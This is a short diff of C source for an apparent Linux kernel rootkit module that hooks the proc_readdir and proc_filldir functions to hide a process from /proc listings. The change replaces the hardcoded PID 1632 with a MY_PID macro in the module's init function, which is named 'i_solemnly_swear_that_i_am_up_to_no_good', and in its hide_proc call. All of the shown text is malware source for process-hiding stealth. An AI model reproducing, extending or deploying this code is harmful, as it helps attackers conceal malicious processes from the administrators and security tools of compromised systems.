@@ -10,6 +10,7 @@
 #include <linux/init.h>
 
 #define TMPSZ 150
+#define MY_PID 1632
 
 static int (*o_proc_readdir)(struct file *file, void *dirent, filldir_t filldir);
 static int (*o_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
@@ -231,10 +232,10 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 
 	
 	#if __DEBUG__
-	printk("Hiding PID %hu\n", 1632);
+	printk("Hiding PID %hu\n", MY_PID);
 	#endif
 
-	hide_proc(1632);
+	hide_proc(MY_PID);
 
 
 
